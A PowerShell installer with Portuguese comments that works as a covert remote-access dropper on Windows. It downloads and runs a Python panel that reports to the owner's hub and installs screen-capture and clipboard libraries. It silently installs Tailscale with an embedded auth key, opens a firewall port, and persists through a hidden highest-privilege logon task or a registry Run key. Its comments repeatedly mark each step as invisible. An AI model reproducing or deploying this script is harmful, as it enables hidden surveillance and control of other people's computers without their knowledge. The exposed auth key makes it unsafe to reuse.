$ErrorActionPreference = "SilentlyContinue"
$folder = "$env:USERPROFILE\testemipo"

# Se ja existe, so garante que rodando
if (Test-Path "$folder\app.py") {
    $proc = Get-Process pythonw -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*app.py*" }
    if (-not $proc) {
        Start-Process pythonw -ArgumentList "-B `"$folder\app.py`"" -WindowStyle Hidden
    }
    exit
}

# ── CRIAR PASTA ──
New-Item -ItemType Directory -Path $folder -Force | Out-Null

# ── BAIXAR APP.PY ──
$githubUser = "nohanvs"
$repo = "nohanpcs"
$baseUrl = "https://raw.githubusercontent.com/$githubUser/$repo/main"

Invoke-WebRequest -Uri "$baseUrl/app.py" -OutFile "$folder\app.py" -UseBasicParsing

# ── CONFIGURAR HUB (IP do Tailscale do dono) ──
$hubIp = "100.66.137.49"
$content = Get-Content "$folder\app.py" -Raw
$content = $content -replace 'HUB_URL = ".*?"', "HUB_URL = `"http://${hubIp}:8000`""
Set-Content -Path "$folder\app.py" -Value $content -Encoding UTF8

# ── INSTALAR PYTHON (INVISIVEL) ──
$hasPython = $false
try {
    $ver = & python --version 2>&1
    if ($ver -match "Python 3") { $hasPython = $true }
} catch {}

if (-not $hasPython) {
    try {
        winget install Python.Python.3.12 --silent --accept-source-agreements --accept-package-agreements 2>$null
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    } catch {
        $url = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
        $installer = "$env:TEMP\python-installer.exe"
        Invoke-WebRequest -Uri $url -OutFile $installer -UseBasicParsing
        Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait -NoNewWindow
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    }
}

# ── INSTALAR DEPENDENCIAS ──
& python -m pip install flask psutil requests mss pyperclip --quiet 2>$null

# ── INSTALAR TAILSCALE (INVISIVEL) ──
$hasTailscale = Test-Path "C:\Program Files\Tailscale\tailscale.exe"
if (-not $hasTailscale) {
    $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.exe"
    $tsInstaller = "$env:TEMP\tailscale-setup.exe"
    try {
        Invoke-WebRequest -Uri $tsUrl -OutFile $tsInstaller -UseBasicParsing
        Start-Process -FilePath $tsInstaller -ArgumentList "/S /tailscale-preauth-key=tskey-auth-k7cjVhDoh321CNTRL-YbXFxFY2cMfKoo7WJqDANfqGW9cREL7M /no-post-install-reboot" -Wait -NoNewWindow
    } catch {}
}

# ── CONECTAR TAILSCALE ──
$tsExe = "C:\Program Files\Tailscale\tailscale.exe"
if (Test-Path $tsExe) {
    try {
        & $tsExe up --hostname=$env:COMPUTERNAME 2>$null
    } catch {}
    Start-Sleep -Seconds 10
}

# ── CONFIGURAR REDE COMO PRIVADA ──
Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue

# ── ADICIONAR REGRAS FIREWALL (INVISIVEL) ──
try {
    New-NetFirewallRule -DisplayName "RemotePanel" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action Allow -Profile Private -ErrorAction SilentlyContinue | Out-Null
} catch {}

# ── AUTO-START INVISIVEL (TAREFA AGENDADA - MAIS CONFIÁVEL QUE REGISTRY) ──
$taskName = "RemotePanelSvc"
try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

$action = New-ScheduledTaskAction -Execute "pythonw.exe" -Argument "-B `"$folder\app.py`"" -WorkingDirectory $folder
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive

try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
} catch {
    # Fallback: registry startup
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RemotePanel" -Value "pythonw -B `"$folder\app.py`""
}

# ── INICIAR PAINEL (INVISIVEL) ──
Start-Process pythonw -ArgumentList "-B `"$folder\app.py`"" -WindowStyle Hidden

Start-Sleep 5

# ── NOTIFICAR DISCORD ──
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
try {
    $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '100.*' } | Select-Object -First 1).IPAddress
    if (-not $localIp) { $localIp = (Test-Connection -ComputerName $hostname -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString }
} catch { $localIp = "N/A" }
Write-Host "Painel instalado: $username@$hostname ($localIp)"
Start-Sleep 2
Stop-Process -Id $PID -Force
